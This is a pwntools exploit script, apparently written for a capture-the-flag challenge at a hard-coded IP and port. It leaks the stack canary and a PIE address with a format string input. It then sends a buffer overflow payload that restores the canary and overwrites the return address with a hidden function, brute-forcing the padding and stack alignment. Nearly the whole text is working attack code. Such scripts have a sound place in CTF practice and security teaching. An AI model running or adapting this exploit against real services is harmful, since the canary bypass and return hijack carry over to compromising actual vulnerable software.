from pwn import *
import re, sys

# ═══════════════════════════════════════
#  FILL THESE IN
# ═══════════════════════════════════════
HOST = '212.2.250.33'       # e.g., 'greeting.ctf7.io'
PORT = 30440               # e.g., 9001
# ═══════════════════════════════════════

SECRET_OFFSET = 0x269
context.arch = 'amd64'

def attempt(pad_size, do_align):
    try:
        io = remote(HOST, PORT, timeout=8)

        # ─── Phase 1: Leak canary + PIE address ───
        io.sendlineafter(b'format', b'%9$p.%11$p')

        data = io.recvuntil(b'name', timeout=5).decode(errors='ignore')

        # Parse leaked hex values
        m = re.search(r'(0x[0-9a-f]+)\.(0x[0-9a-f]+)', data)
        if not m:
            vals = re.findall(r'0x[0-9a-f]+', data)
            canary   = int(vals[0], 16)
            pie_leak = int(vals[1], 16)
        else:
            canary   = int(m.group(1), 16)
            pie_leak = int(m.group(2), 16)

        # ─── Calculate addresses ───
        pie_base    = pie_leak - (pie_leak & 0xfff)
        secret_func = pie_base + SECRET_OFFSET
        # ret gadget guess: the byte right before secret_function
        # (previous function's 'ret' instruction)
        ret_gadget  = pie_base + SECRET_OFFSET - 1  # offset 0x268

        # ─── Phase 2: Buffer overflow payload ───
        payload  = b'A' * pad_size       # padding to reach canary
        payload += p64(canary)           # restore canary (pass check)
        payload += b'\x00' * 8           # overwrite saved RBP
        if do_align:
            payload += p64(ret_gadget)   # fix 16-byte stack alignment
        payload += p64(secret_func)      # hijack return → flag!

        io.sendline(payload)

        out = io.recvall(timeout=4).decode(errors='ignore')
        io.close()

        # Check for flag
        if 'ctf7{' in out or 'flag{' in out or 'CTF' in out:
            return out
        return None

    except:
        try: io.close()
        except: pass
        return None

# ═══ Brute-force buffer-to-canary distance ═══
context.log_level = 'warn'
print("[*] Brute-forcing buffer-to-canary offset...")

for pad in range(8, 300, 8):
    for align in [False, True]:
        label = f"pad={pad:<3d} align={align}"
        result = attempt(pad, align)
        if result:
            print(f"\n[+] ✅ SUCCESS with {label}")
            print(result)
            sys.exit(0)
        else:
            print(f"[-] {label} — no flag")

print("\n[!] No flag found. See troubleshooting below.")